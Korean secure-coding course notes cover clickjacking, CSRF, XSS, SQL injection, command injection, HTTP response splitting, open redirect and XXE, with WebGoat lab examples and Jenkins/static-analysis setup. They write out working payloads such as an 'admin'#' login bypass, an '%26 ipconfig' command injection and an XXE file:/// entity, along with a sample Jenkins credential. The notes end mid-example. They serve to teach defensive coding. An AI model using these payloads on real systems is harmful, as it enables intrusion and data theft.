#)클릭제킹 : 사용자의 클릭이 의도하지 않은 화면을 클릭하게 해서 사용자의 의도와 다른 이벤트를 발생
- 예를들어 광고레이어를 투명하게 만들어서 안보이게하고 클릭하면 광고페이지로 이동
//web.xml에 추가해서 해결
<filter>
        <filter-name>httpHeaderSecurity</filter-name>
        <filter-class>org.apache.catalina.filters.HttpHeaderSecurityFilter</filter-class>
        <init-param>
            <param-name>antiClickJackingOption</param-name>
            <param-value>SAMEORIGIN</param-value>
        </init-param>
    </filter>
-------------
#)CSRF 공격(Cross Site Request Forgery)은 인터넷사용자(희생자!!)가 자신의 의지와는 무관하게 공격자가 의도한대로(수정,삭제 등) 특정 웹사이트에
요청하게 만드는 공격이다. 즉, CSRF를 통해 해커는 희생자의 권한을 도용하여 중요 기능을 실행하는 것이 가능하다.
CSRF는 해커가 사용자의 컴퓨터를 감염시키거나 페이스북 서버를 해킹을 해서 이뤄지는 공격이 아니다.

#)XSS와 CSRF의 차이
XSS는 공격대상이 Client이고 CSRF는 Server이다.

#)XSS와 CSRF의 공통점
둘다 스크립트 공격이다.

XSS는 사용자가 특정웹사이트를 신용하는 점을 노림
CSRF는 특정 웹사이트가 사용자의 웹 브라우저를 신용하는 것을 노림

XSS는 사이트변조나 백도어를 통해 클라이언트에 대한 공격을한다.
CSRF는 요청을 위조하여 사용자의 권한을 이용해 서버에 대한 공격을한다.

CSRF는 일단 사용자가 웹사이트에 로그인한 상태에서 공격자가 등록한 조작된 요청정보를 담고있는 게시물을 열면
해당 웹사이트는 위조된 공격명령이 믿을 수 있는 사용자로부터 발송된 것으로 판단하게 되어 피해를 입는다.

XSS는 희생자 클라이언트 PC에서 실행되며 사용자의 정보를 탈취하는 것이고, CSRF는 위조된 요청을 서버에 보내어 서버단에서 스크립트가 실행됩니다.

XSS는
1. 취약점을 찾아서 세션 쿠키를 탈취하는 스크립트를 사이트에 삽입합니다.

2. 사용자가 그 웹사이트에 접근할 때마다 스크립트가 작동합니다

3. 스크립트를 통해 침입자에게 사용자의 세션 쿠키가 전달됩니다.
input 박스에 사용자가 <script>hello</script> 이렇게
그래서, 스크립트 태그를 필터링 할 필요가 있다. <는 &lt; 등으로 필터링을하면 
사용자에게는 <script>로 보이지만 실제는 &lt;script&gt; 로 브라우저에서는 일반문자로 인식되서 스크립트가 실행되지 않는다.


CSRF는
1. 침입자는 하이퍼링크에 자금 전송 요청에 대한 스크립트를 삽입하고 사이트에 로그인할 사람들에게 전송합니다.

2. 사용자는 링크를 누르고(외부링크), 의도치않게 서버로 요청을 보내게 됩니다.

3. 서버는 로그인 되어있는 사용자의 요청이기 떄문에 정상으로 인식하고 침입자에게 돈을 전송합니다.

CSRF는 사용자의 권한을 이용하여 게시물 작성에 <html> ~~<html> 이렇게 작성하는 방법과(기존 form id,value를 분석해서)
또는 공격자가 만든 사이트 링크를 보내서 공격하는 방법이있다.

GET을 이용한 공격방법(URL방법)
A라는 사이트에 비밀번호변경페이지에서 입력란이 NewPassword, Confirm Password만 있을경우 (기존비밀번호는 입력안할때)
만약에 A라는 사이트의 사용자 비밀번호 변경!!!!을 하는 경우 주소패턴이 abc.com/user.do?cmd=user_passwd_change&user=admin&newPwd=1234
라고하면 이러한링크를 사용자의 메일로보내서 읽게되면 비밀번호가 바뀐다.(관리자계정으로 로그인되있으면 관리자계정 비밀번호를 바꿀수있다) 
그래서 비밀번호 변경시에는 공격자가 기존 비밀번호를 모르기때문에 기존비밀번호입력란을 만들어서 공격을 방지할 수 있다.

POST를 이용한 공격방법(Form이용)
기존의 비밀번호 변경하는 페이지가 위에처럼 New, Confirm만 있다고 가정하에 그럼 form에 new, confirm 패스워드만 몰래 넣어서 action을 비밀번호 변경.do로 가면 변경이된다.
그래서 공격자는 form태그로 만든 게시물을 올려서(이것도 XSS취약점) 게시물을 사용자가 클릭하면 해당 계정은 비밀번호가 변경되는 것이다. -> 자동스크립트로인해
<script>
	document.forms[0].submit();
</script>



-------------
#)Application error disclosure(탐지된 오류 노출)
400(Bad Request), 401(Authorization Required), 403(Forbidden), 404(Not Found), 500(Internal Server Error) 등과 같이
웹 서버에서 오류가 발생할 경우 이에 대한 상세한 정보가 노출되는 경우에 탐지된다.

웹 브라우저에 에러페이지 뜨면서 톰캣버전, stacktrace를 통해 서비스의 내부 구조를 파악할 수 있다.

-------------
#)Directory Browsing(디렉토리 나열) 취약점
직접적인 공격 방법은 아니나 디렉토리 내의 파일목록을 노출시킴으로써 서비스 운영자가 노출을 원하지 않았던
파일들이 노출되고 서비스 구조파악에 도움을 줌으로써 공격에 도움이 될 수 있다.
디렉토리 나열 취약점으로 탐지된 URL을 웹 브라우저로 접속을 하면 디렉토리 구조가 보인다.

--------------
#)Session은 브라우저당 한개이다.(크롬,엣지 등)

예를들어 F12에서 보이는 JSession이다. 디버그를 돌리면 Session안에 Attributes 라는게 있다. 
거기서 CSRF_TOKEN을 key:value로 안에 쏙 넣은것이다.
즉 Session(4CDF~) { CSRF_TOKEN=5c~~, loginVO=~   }

if(request.getSession().getAttribute("CSRF_TOKEN").equals(param)) {
				
			}
if(param == null) {
		HttpSession session = request.getSession();
		session.setAttribute("CSRF_TOKEN", UUID.randomUUID().toString());
}


=============================================================================================
#)공개SW를 활용한 개발보안 점검가이드
개발자는 이클립스에 플러그인 된 Spotbugs, FindSecurityBugs, PMD를 활용하여 점검 후 형상관리서버에(SVN) 반영한다.

개발자 - 이클립스  ----(이클립스에 플러그인된 Spotbugs, FindSecurityBugs, PMD)   --- 수정후 아래 형상관리서버에 commit 

형상관리서버 
    |
	|
Jenkins
    |
    | (Jenkins에 플러그인된 Spotbugs, FindSecurityBugs, PMD)
	|
Spotbugs, FindSecurityBugs, PMD  ---- 분석 후 Jenkins가 받아서 전달


-------------------------
#)Spotbugs(FindBugs)
Spotbugs는 자바바이트코드를 분석하여 버그 패턴을 발견하는 정적분석 공개 소프트웨어이다.
Spotbugs에서 탐지가능한 오류들 
1. Bad practice : 클래스 명명규칙, null 처리 실수 등 개발자의 나쁜습관을 탐지
2. Correctness : 잘못된 상수, 무의미한 메소드 호출 등 문제의 소지가 있는 코드를 탐지
3. Dodgy code : int의 곱셈결과를 long으로 변환하는 등 부정확하거나 오류를 발생시킬 수 있는 코드를 탐지
4. Experimental : 메소드에서 생성된 stream이나 리소스가 해제하지 못한 코드를 탐지
5. Internationalization : Default 인코딩을 지정하지 않은 경우 등 지역특성을 고려하지 않은 코드 탐지
6. Malicious code vulnerability: 보안 코드에 취약한 가변적인 배열이나 콜렉션, Hashtable탐지
7. Multithreaded correctness : 멀티쓰레드에 안전하지 않은 객체 사용등을 탐지
8. Performance: 미사용필드, 비효율적 객체생성등 성능에 영향을 주는 코드 탐지
9. Security: CSS, DB 패스워드 누락 등 보안에 취약한 코드 탐지

설정은 Preferences - java - spotbugs에 있다. Detector configuration탭에서 검사항목 선택가능

----------------------------
#)FindSecurityBugs(동적)
spotbugs의 플러그인이다. OWASP TOP 10과 CWE를 커버하는 78개의 버그패턴 탐지 할수있다
부적절한 입력탐지, SQL Injection, XSS, 취약한 암호화 알고리즘, 취약한 URL Redirection 등

인터넷에서 https://find-sec-bugs.github.io/download.htm 여기서 plugin(jar파일)을 다운받으면된다.


------------------------------
#)PMD(정적분석)
Spotbugs는 자바바이트코드를 분석한다면 PMD는 소스코드를 분석하여 변수처리, catch block 등 탐지

preferences - PMD - run configuration으로 원하는 분석 체크가능

* CI(Continuous Integration) : 하나로 합칠 때 문제가 되는데 코드를 작성할 때 마다 바로바로 합치자는 것이 CI이다.
-------------------------------
* 빌드란

원시파일 - 컴파일러(compile) - 오브젝트파일(.class) - 링커 - 실행파일(.jar)

인텔리제이에서 개발자가 작성한 소스코드(.java)는 사람은 해석할 수 있지만, 기계는 알아들을 수 없기에 이를 원시파일 이라고 합니다.
이를 컴퓨터가 알아들을 수 있게 바이너리 파일로 만들어주는 과정을 컴파일 이라고 합니다.
컴파일을 거치게 되면 컴퓨터가 알아들을 수 있는 바이너리 형태의 오브젝트 파일(.class) 이 나오게 됩니다.
오브젝트 파일이 컴퓨터가 알아들을 수 있다고 해서 바로 실행할 수 있는 것은 아닙니다.
프로그래밍을 할 때, 다른 외부 라이브러리, 함수 등등의 다른 리소스를 사용하기 때문에 이러한 리소스를 연결시켜주는 과정이 필요한데 이를 링크 라고 합니다.
자바의 경우에는 다른 언어와 다르게 별도의 링크과정이 존재하지 않고, 런타임에 필요한 클래스들이 자바 가상기계에 링크되며 클래스 로더가 동적으로 필요한 클래스를 로딩합니다.
이렇게 링크를 통해 실행파일(.jar) 이 나오게 됩니다.
빌드란 사람들이 알아들을 수 있는 형태의 원시파일을 실제 컴퓨터에서 실행할 수 있게끔 만드는 이 일련의 과정을 빌드 라고 합니다.
정리하자면, 컴파일은 빌드 안의 부분집합 입니다.

즉, 실행가능한 파일로 만드는 과정을 빌드라고 한다.

빌드 -> 테스트 -> 통합 -> 배포
 |-----(CI)-----|    (CD)

위와 같은 것을 제공해주는 툴이 젠킨스, GitLab 

-------------------------------
#)Jenkins(정적분석 리포팅, 지속적통합) -> 빌드,테스트,통합,배포 
빌드와 테스트를 지원하는 천개넘는 플러그인이 제공된다.
장점은 확장성인데 개발언어에 따라서 플러그인을 맞춰주면 최적화된 개발환경이 제공된다.
추가/변경된 코드를 자동으로 빌드한 후 테스트 후 공유 레포지토리에 병합


젠킨스를 설치하기 전에 톰캣서버가 실행되있어야한다. + JDK

젠킨스 설치후 포트를 정하면 localhost:8088 치면은 젠킨스 서버가 실행이 되고 젠킨스 페이지가 자동으로 열린다.
그 후, 관리자 비밀번호를 설정해야한다. C/ProgramData/Jenkins/.jenkins/secrets/initialAdminPassword 에 있는 거 그대로 넣기
그 다음 install suggested plugins 선택 -> 플러그인 설치가 끝나면 계정 설정 창이 나온다. -> 원하는 계정,암호
-> jenkins URL은 http://localhost:8088 로 하면 된다.
-> 여기까지하고 주소창입력하면 젠킨스서버가 구축된걸 볼 수 있다.
-> edinet edinet(계정 비밀번호)

=========================================================================
//시큐어코딩 교육
8/9
#)파일다운로드
리모트파일인쿠루젼(RFI) -> 외부 lib 등 참조 과정에서 발생 <--->  로컬파일인쿠루젼(LFI)
공격자가 파라미터 조작 download.do?file=../../mypic.jpg (이게 LFI)

<script> alert('xss'); </script> 와 같은 형태의 코드 실행을 막을려고 할 때

input = "<script>";
if (input.equals("<script>")) {	⇐ 해당 입력을 차단
	... 오류 처리 ...
}

input = "    <script>    ";
if (input.equals("<script>")) {	⇐ 해당 코드로 입력을 차단할 수 없음
	... 오류 처리 ...
}

검증 로직 우회를 최소화하기 위해서는 입력값을 정규화/규범화하여 검증을 실행해야 함 => 새니타이즈
<x>1<x>    <y>2</y>		⇒ <x1>1</x><y>2</y>	⇒ 규범화 (다 동일한 형태로 바꾸는 것이지만 데이터 손실은 발생하지 않도록)
<x>1</x>	<y>2</y>

또 다른 예시로
100달러
100 dollars   이거를 비교해야하는데 포맷이 다르다 -> $100 로 통일하는 것이 정규화라고 한다.(일부 데이터 손실이 있다고 한다면 정규화)

-----------------------------------
#)새니타이즈 -> 입출력 시스템의 요구사항에 맞도록 데이터를 가공하는 과정(공격자는 항상 변형해서 공격하기 때문에)
예) input = " <ScRiPt>  ";   -> 조작된입력
1) 불필요한 공백제거 input = "<ScRiPt>"; -> 규범화
2) 통일 input ="<script>";   -> 정규화
3) 검증 if("<script">.equals(input))  -> 검증로직  

-------------------------------
#)스토어드스크립트 -> DB에 <script> ~ 이렇게 저장되있는걸 그대로 읽는것
#)반사형스크립트 ->  <a href="checkid.do?id=<script>...</script>"> 반드시 누르고 싶도록 하는 내용 </a> -> 해당 id값 이 존재하는지 서버가 보여준다.
                -> 이러면 공격자가 스크립트가 먹히는걸 알수있으니 스크립트 내용을 단축URL로 변형해서 원치않는 사이트로 이동가능 및 서버정보 빼올수도있고, 가짜페이지를 만들수있다.
---------------------------------
정적 분석 ⇒ 프로그램을 실행하지 않고, 소스 코드의 내용, 형태 등을 보고 문제점을 찾는 것

동적 분석 ⇒ 프로그램을 실행해서 원하는 결과가 제공되는지를 확인
					결과(값, 처리) → 디버깅
                                        보안성 제공 → 모의해킹
                                        성능 제공 → 부하테스트

퍼징테스트 -> 비정상적인 입력에 대한 시스템 오류가 나오는지 확인(나쁜예: 500에러코드페이지, 좋은예: "다시 입력해주세요:)
--------------------------------------------
최근에 보안방법론 -> 제로트러스트
전통적인 보안시스템은 접근통제부터 시작, 한번만 인증받으면 됨 -> 이게 트로이목마로 꺠짐(안에서 발생) 
이걸 바꾼게 제로트러스트이다. (접근에 신뢰를 주면안된다 -> 전통적인 해자모델이 깨졌다)
-> 접근할때마다 인증,인가를 받는다.
자원에 대한 접속이있을 때마다 인증,인가를 받는다(더 나아가서 기기, 위치까지 본다) -> 제로트러스트

#)애자일 -> 고객에 대한 요구사항을 적극적으로 수용

#)실제 운영되는 사이트에 올릴려니 잘안됨 -> 바로 배포할수있도록하는게 DevOps (개발과 운영을 하나의 프로세스로 통합)

#)색을 바꾸는데 모든 서비스가 영향받는데(옛날) -> 마이크로서비스(즉, 서비스 단위로 나눈다), 서비스에 맞는 인프라, 기술

#)CI/CD 배포 자동-> 내가만든소스코드가 정해진 규칙에따라서 운영서버에 배포(원래는 수동으로 배포하고 수정되면 다시 배포했는데)

#)개발과 운영의 결합을(DevOps) 통해 애자일을 실현가능하게 했지만, 보안성이 약함 -> DevSecOps의 필요성

#)도커는 실행환경까지 같이 담겨져버리니까 원래는 실행환경이 다르면 lib도 다를수도 있어서 에러가 날수있지만 컨테이너로 나누면
  실행환경이 달라도 된다.

------------------------------------------------------
#)HTTP는 stateless하다 -> 연관관계가 없다(누가 요청했는지 모른다) -> 즉, 요청할때만 준다. 응답을 받아가면 연결을 끊어버린다.
문제는 주식같은경우에는 요청하지않으면 주식실시간가격을 못본다? 이거는 문제가된다. 즉, 요청하지않아도 와야되는 서비스가 있을수있다.

네이버같은경우에는 한번의 연결을 통해 다 준다.(프로토콜버전 업그레이드 통해서)

HTTP/1.0: 한번요청,응답 끊고
HTTP/2 : 다중연결유지

#)HTTP/1.x 연결관리
1) 단기커넥션(많으면 부하가생김) -> 그래서 keep alive커넥션등장(헤더를 사용해 최소연결유지시간을 설정)
2) HTTP 파이프라이닝 -> 한번에 이게 필요해, 이게필요해,.. 던짐 (구현이 어려워 사용x)
3) 도메인샤딩 -> 하나의 도메인에서 모든 리소스를 가져오는 대신 몇개의 도메인으로 분할 -> 성능향상

#)HTTP cache -> get방식 처리할때(캐시에 저장했다가 사진이나 같은 걸 바로 던져준다)
#)Origin제약완하 -> Origin을 구성하는 세가지가 있는데 
http://www.test.com:8080/data/abc.gif (http: 프로토콜, www.test.com: 호스트, 8080: 서비스포트 -> 이 세가지를 Origin(출처)이라한다) 이중에 하나라도 다르면 출처가 다르다고 한다.

#) Origin출처가 달라도 가져올수 있지만 b.com (스크립트 코드를 통해서) a.com에서 제공하는게 아니라면(정책을 작성했다면) 못쓰게된다 -> SOP(Same Origin Policy) 
왜냐하면 <script src=""> 이거는 안전하지만 <script> ~ <script> 를 통해 가져온거는 코드가 중간삽입될 가능성이 있기때문에 위험성이있다.
근데, api같은건 차단되니까 우리서버에서 가져와서 요청해서 가져온다.(마치 a.com에서 온것처럼, 근데 이거는 부하가있다) 
그래서 완화시키는 정책이 CORS 이다 -> 서로다른 Origin이라도 리소스를 가져와서 쓸수있게해준다. b.com을 가져와서 쓸수있게 해준다.(가져올순있지만 쓸수있는게 중요하다)

요즘에는 클라우드라서 서비스가 다 분산되있어서 출처가 다다르다. 그래서 더더욱 중요

#) 원래 HTTP는 세션개념이 없고 어플리케이션이 만든거임. 로그인이 성공하면 SID=123 을 다음에 가져오라고 클라이언트에게 전달 -> 클라이언트는 123을 가지고 서버에게 전달 후 인증 (이거를 쿠키라는 개념으로 주고받음)

#)응답분할문제 -> 응답본문을 제어할수있다. 응답본문에 스크립트를 넣을수있다.

C:\Users\DISKTOP-000> curl -v www.naver.com
* Rebuilt URL to: www.naver.com/					⇐ 연결 생성
*   Trying 223.130.195.200...
* TCP_NODELAY set
* Connected to www.naver.com (223.130.195.200) port 80 (#0)
> GET / HTTP/1.1							⇐ 요청 시작 → 방식(method) + 자원(URI) + 프로토콜
> Host: www.naver.com							⇐ 요청 헤더 시작	
> User-Agent: curl/7.55.1
> Accept: */*
>									⇐ 요청 헤더 끝 (GET 방식이므로 요청 본문은 생략)
< HTTP/1.1 302 Moved Temporarily					⇐ 응답 시작 → 프로토콜 + 응답코드 + 응답설명
< Server: NWS								⇐ 응답 헤더 시작
< Date: Wed, 09 Aug 2023 07:33:55 GMT
< Content-Type: text/html
< Transfer-Encoding: chunked
< Connection: keep-alive
< Location: https://www.naver.com/
< Vary: Accept-Encoding,User-Agent
<									⇐ 응답 헤더 끝
<html>									⇐ 응답 본문 → 사용자에게 보여질 내용
<head><title>302 Found</title></head>
<body>
<center><h1>302 Found</h1></center>
<hr><center> NWS </center>
</body>
</html>
* Connection #0 to host www.naver.com left intact
---------------------------------------------------

input = request.getParameter("cookie");
response.setCookie("mycookie", input);

해당 코드를 통해서 만들어지는 응답 헤더는 아래와 같은 형태가 됨
HTTP/1.1 200 OK↳
Server: NWS↳
Date: Wed, 09 Aug 2023 07:33:55 GMT↳
Content-Type: text/html↳
Set-Cookie: mycookie=______________↳
Vary: Accept-Encoding,User-Agent↳
↳
<html>...</html>

입력값으로 개행문자를 포함한 입력을 전달하는 경우 ...?cookie=abcd↳↳<script>...</script>↳HTTP/1.1 200 OK //개행문자가 2개연속으로되야 헤더가 끝났다고 한다.
HTTP/1.1 200 OK↳						⇐ 원래 응답
Server: NWS↳
Date: Wed, 09 Aug 2023 07:33:55 GMT↳
Content-Type: text/html↳
Set-Cookie: mycookie=abcd↳↳<script>...</script>↳HTTP/1.1 200 OK↳	⇐ 파라미터로 전달된 코드에 의해서 만들어진 응답(새로운 응답이 생김)
Vary: Accept-Encoding,User-Agent↳
↳
<html>...</html>

------------------------------------------------------------------
#)위의 방식은 HTTP응답 구조를 이용한 공격이라면
#)HTTP요청 구조를 이용한 공격 -> 개행문자가 2개연속으로 나와야 헤더가 끊나는데 연결을 끊지않을려고 2개연속으로 쓰지않고 계속 하나씩 던짐(커넥션을 계속 물고있음)

-------------------------------------------------------------------
#) POST방식은 요청본문에 값을 넣는반면 GET방식은 값이 보인다. 근데 큰차이는 없다. 도구를 이용하면 결국보인다.
   Content-type=url-encoding은 요청본문이 어떤방식으로 인코딩됬는지 나타낸다. -> key=value&key=value 이런식으로 해준다. (하나의문자열로)
   form-data도 Post방식인데 이거는 하나의 문자열로 나타내기에는 가변적인 내용이라서 단락으로 나눠서 보낸다. boundary라는 키워드를 자동으로 생성해준다.
   boundary로 구분한다. 이렇게 파트별로 나눠저있는데 multipart-form-data 이다.

----webkitFormBoundary~

----webkitFormBoundary~ 이런식으로


#) 또 본문이 어디서 어디까지인지 Content-Length 로 요청본문이 다 왔다고 판단.
#) 공격기법이 content-length를 크게잡고 1byte씩 계속 던진다.
--------------------------------------------------------------------------
#) Options라고요청을하면 서버가 헤더의 allow에다가  -> 메서드 목록을 보여준다.(그래서 Options를 보여주면 안된다)
#) HEAD로 요청을하면 응답이 헤더만 오는것이다. (해당하는 서버가 어떠한 리소스가 있는지 스캐닝을한다. 본문까지 받을 필요없으니까, 리소스가 있는지는 200ok로 본다. -> 비활성해야 좋다
#) PUT은 자원생성요청 -> 요청본문에 작성해서 -> 201created로 응답이온다. 200ok로 오는경우도있다.
#) PUT,DELETE가 될려면 권한이 있어야한다.

------------------------------------------------------------------------------
#) http://www.example.com:80/path/myfile.html?key1=value#mark   //#은 프래그먼트 라고한다. 클라이언트에서만 사용, 서버에 전달되지는 않는다.(책갈피개념, 페이지 내에서 클릭하면 페이지내 해당위치로이동)
------------------------------------------------------------------------------
#) Redirection은 url 재요청이기때문에 제한을 둬야한다. (화이트리스트쓰는게 좋다)
String url = request.getParameter("url");		⇐ 외부 입력값을 검증, 제한하지 않고 리다이렉트 주소로 사용
							   ⇒ 의도하지 않은 주소로 이동 ⇒ 피싱 공격에 이용	
response.sendRedirect(url);				⇐ Java에서 리다이렉트를 구현


정상적인 처리 
http://www.test.com/changePage.do?url=main.do
→ 사용자에게 http://www.test.com/main.do 처리 결과가 전달

비정상적인 처리 
http://www.test.com/changePage.do?url=http://www.hack.com/main.do
→ 사용자에게 http://www.hack.com/main.do 처리 결과가 전달
==================================================================================
#)쿠키는 서버와 클라이언트간의 식별을 위해(상태 기반의 정보를 기억하도록 하는것 원래,HTTP는 stateless니까)
응답헤더에 서버가 response로 준다. set-cookie

#)보안쿠키 : https통신할때만 전달
set-cookie: id=seong; Expires=wed; secure

#)HttpOnly : 스크립트에서 쿠키로 접근하는걸 막을 수 있다. Document.cookie API에 접근차단.
  set-cookie: id=seong; Expires=wed; secure; HttpOnly

-----------------------------------------------
#)세션 -> 세션이 있는거처럼 만들어주는거임. (세션이 나오기전에는 쿠키에다가 사용자정보를 저장했는데 이러면 클라이언트측에서 위변조, 스니핑할수있다)
서버가 ID를 발급해서 SessionId를 준다. 쿠키로 -> 문제는 이거도 쿠키로 왔다갔다하는데 이거도 리스크가 있긴하다.

#)세션 단점이 서버가 다르면 세션이 다르다(다른서버끼리 세션을 공유못한다), 그래서 JWT라는 토큰을 이용한다. -> 토큰을 한서버에서 발급받으면 다른서버에서 검증을한다.
(버스토큰처럼 버스토큰만 맞으면 어느 버스에서도 탈수있다, 토큰의 내용이 JSON형태로 되어있다.) 즉, 마이크로서비스로 점차 바뀌고있어서 JWT로 바뀌고있다.

#)프록시에서 모니터링(클라이언트요청을 대신받아서 서버에 전달) 및 캐싱가능 -> 이게 하나의 피시에 들어가면 로컬프록시가된다.(BurpSuite) 



GET /WebGoat/ HTTP/1.1
Host: localhost:7070
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: ko-KR,ko;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Authorization: Basic d2ViZ29hdDp3ZWJnb2F0   //이 인증방법은 올바르지않다. -> 디코딩하면 webgoat:webgoat 이렇게 다나온다.

------------------------------------------------
#)쓰레드는 동기화오류가 중요하다(100원을 먼저입금했는데 200원입금이 먼저처리되는 현상). 이걸막기위해서 동기화처리(순서대로) -> 번호표뽑아서 띵동되면 가는것. -> 문제점은 대기시간이 걸릴수가있다.
그래서 중요한것이 동기화처리범위이다. 은행들어갈때부터 공유자원차지하면(교착상태) 안되니까 띵동할때만 가는것으로 해야한다.

- 싱글톤으로 존재하는 객체들의 멤버변수가 여러 스레드에 의해 공유되면서 다른 스레드에게 정보를 노출
#) 파라미터 username을 전역변수에 저장한다고하면 -> 이걸쿼리로 만든다고 가정했을 때(1번 submit에서 username:jeff, 2번 submit에서 username: dave)-> 
근데 또 누가 다른username으로 입력하면 전역변수가 바뀐다. dave로 바뀐다. 1번유저는 jeff로 입력했지만 dave로 나온다.

---------------------------------------------------------------------------
JSP 선언문(Declaration) vs 스크립트릿
#1 /openeg/WebContent/WEB-INF/board/list.jsp 파일에 아래 코드를 추가 

<%@ page language="java" contentType="text/html; charset=UTF-8"
    pageEncoding="UTF-8"%>
<%@ taglib prefix="c" uri="http://java.sun.com/jsp/jstl/core" %>
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>

<%!
	String sss = "sss";
%>

<%
	String xxx = "xxx";	
%>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<title>게시판 글 목록 보기</title>
<link href="<%=request.getContextPath()%>/css/board.css" rel="stylesheet" type="text/css" />
<link href="<%=request.getContextPath()%>/css/main.css" rel="stylesheet" type="text/css" />
<script type="text/javascript" src="<%=request.getContextPath()%>/js/jquery-1.7.1.js"></script>

#2 컴파일되 JSP 파일의 내용을 확인
C:\FullstackLAB\workspace\.metadata\.plugins\org.eclipse.wst.server.core\tmp1\work\Catalina\localhost\openeg\org\apache\jsp\WEB_002dINF\board\list_jsp.java

선언문에서 정의한 sss 변수는 list_jsp 클래스의 멤버 필드로, 스크립틀릿에서 정의한 xxx 변수는 _jspService 메서드의 지역변수로 정의된 것을 확인

#) <%! ~ %> 이거는 멤버필드(전역변수) -> 사용 비추천
   <% %> 이거는 메서드안에 변수선언

-----------------------------------------------
- SQL 인젝션 취약점을 이용한 인증과정 우회
#) burpsuite를 보니까 화면에서 입력한 aaa, bbb는 요청 파라미터 userId와 userPw를 통해서 서버로 전달되는 것을 확인

서버에서는 전달된 요청 파라미터를 이용해서 아래와 같은 쿼리를 생성, 실행하는 것을 유추할 수 있음
login.do?userId=aaa&userPw=bbb
select * from user_table where userId = 'aaa' and userPw = 'bbb'

만약 요청 파라미터로 전달된 값에 쿼리 조작 문자열 포함 여부를 확인하지 않고 사용한다면, ... 
login.do?userId=aaa'&userPw=bbb'  //여기서 따옴표를 한개 추가시킴 오류발생시킬려고
select * from user_table where userId = 'aaa'' and userPw = 'bbb''  //일부러 따옴표를 한개더적어서 오류발생시켜서 오류정보로 서버 등 정보수집가능

수집한 정보(mysql이고, 입력값을 검증하지 않고 사용)를 이용해서 추가 공격을 시도
login.do?userId=aaa'#&userPw=bbb'#   //실제입력을 aaa'#
select * from user_table where userId = 'aaa'#' and userPw = 'bbb'#'  //mysql에서 #은 주석이라서 userId='aaa' 까지만읽는다.("가입된 사용자ID가 아닙니다", 그러면 가입된ID로 해보자)
즉,pw를 입력안해도 로그인을 할 수있게된다.

ID : admin'#  
PW : 1234   //아무거나입력하면 로그인된다.

#)즉, 커리를 만들때 문자열로 더해서 만들면 안된다.
String sql = "select * from member where id = '" + request.getParameter("id") ..  -> 이 방식은 statement방식이다. Statement stmt = con.createStatement()
그래서, PreparedStatement 를 통해서 해야한다.  String query = "select * name=?"; -> PreparedStatement stmt =con.prepareStatement(query)

#) UNION Based SQL인젝션
기존 조회쿼리에 공격자가 알고자하는 정보를 조회하는 쿼리를 조인한 결과가 출력되도록(1+1 덤개념)

#) $는 입력값자체가 문자열로 취급 , #을쓰면 구문자체가 preStatement로 처리 -> #부분이 ? 로 바뀌기 때문에 쿼리가 안전하게 만들어준다.
select ~ where name = '${phone}'
select ~ where name = #{name}
---------------------------------------------------------------
#) command injection (쉘명령어)
Runtime exec메소드를 사용
String input = request.getParameter("cmd"); //검증하지 않고 바로 던짐
Runtime.getRuntime().exec(input)

String input = request.getParameter("file");
Runtime.getRuntime().exec("type c:\\data\\" + input);

정상 실행
view.do?file=mydata.txt		⇒ c:\data\mydata.txt 파일의 내용을 출력

비정상 실행
view.do?file=mydata.txt & ipconfig 	⇒ c:\data\mydata.txt 파일의 내용과 함께 의도하지 않은 ipconfig 실행 결과도 반환
                        ~
                        명령어 실행을 연결 -> 전달할때 %26으로 URL 인코딩해서 전달해야 함
			type c:\data\mydata & ipconfig


HelpFile=AccessControlMatrix.help" %26 ipconfig -all&SUBMIT=View
                                 ~
				 "는 type명령어의 파라미터를 끝내는 용도
 				%26은 명령어를 연결하는 &문자를 URL 인코딩

소스 코드를 확인하면 파라미터로 전달된 값이 운영체제 명령어의 파라미터로 사용 
Runtime.getRuntime().exec("type \"c:\.........\AccessControlMatrix.help\"")

조작된 입력을 전달하면 아래와 같은 형태의 코드가 실행
Runtime.getRuntime().exec("type \"c:\.........\AccessControlMatrix.help" %26 ipconfig -all\"")
⇒ type \"c:\.........\AccessControlMatrix.help" 명령어가 실행되고 이어서 ipconfig -all 명령어가 실행됨

------------------------------------------------------------------------
#) xss 공격을 막기위해서 브라우저에서 제공하는기능 -> csp (스크립트가 믿을수있는지를 보증)

Tabnabbing : (피싱)동영상 new타겟으로 새창을 열고 전에 띄웠던 페이지에서 공격자가 계속 공격코드가 진행되는 것

==================================================================
#)XXE 취약점 

#1 Intercept를 이용해서 요청 파라미터 내용을 확인(댓글입력) → XML 문서의 일부로 전달되는 것을 확인 

POST /WebGoat/xxe/simple HTTP/1.1
Host: localhost:8282
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: ko-KR,ko;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/xml    //xml문서로 파라미터를 던진다(댓글내용)
X-Requested-With: XMLHttpRequest
Content-Length: 58
Origin: http://localhost:8282
Connection: close
Referer: http://localhost:8282/WebGoat/start.mvc
Cookie: JSESSIONID=tDAHsbQeVX4QU8w3a0lb56rbOpMjLuSXy9kJIqsg

<?xml version="1.0"?>   //burpsuite에서 수정
<comment>
	<text>
	   댓글내용
	</text>
</comment>


공격 1. <!DOCTYPE> 태그를 이용해 외부 엔티티를 만들어 LFI(Local File Inclusion) 공격을 시도
공격 문자열(댓글입력)
POST /WebGoat/xxe/simple HTTP/1.1
Host: localhost:8282
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: ko-KR,ko;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/xml
X-Requested-With: XMLHttpRequest
Content-Length: 58
Origin: http://localhost:8282
Connection: close
Referer: http://localhost:8282/WebGoat/start.mvc
Cookie: JSESSIONID=tDAHsbQeVX4QU8w3a0lb56rbOpMjLuSXy9kJIqsg

<?xml version="1.0"?>  //댓글내용 burpsuite로 수정
<!DOCTYPE hack [<!ENTITY rootdir SYSTEM "file:///">]>
